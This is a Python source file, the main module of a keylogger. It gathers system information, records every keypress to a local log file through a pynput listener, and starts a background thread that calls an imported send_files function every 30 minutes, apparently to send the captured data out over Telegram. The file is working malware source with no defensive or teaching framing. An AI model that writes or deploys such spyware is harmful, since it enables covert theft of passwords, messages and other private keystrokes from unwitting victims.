#Main keylogger
import sys
import os

# Rest of the imports below
import pyautogui
import time

#Import Modules
import threading
from pynput import keyboard
from key_logger import Keypress
from comp_info import system_information
from tele import send_files


def periodic_send(interval_seconds: int = 30 * 60):
    while True:
        send_files()
        time.sleep(interval_seconds)


#Main function (Used to listen)        
if __name__ == "__main__":
    system_information()
    open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "key_log.txt"), "a").close()
    listner = keyboard.Listener(on_press=Keypress)
    listner.start()
    sender_thread = threading.Thread(target=periodic_send, daemon=True)
    sender_thread.start()
    while True: 
        time.sleep(1)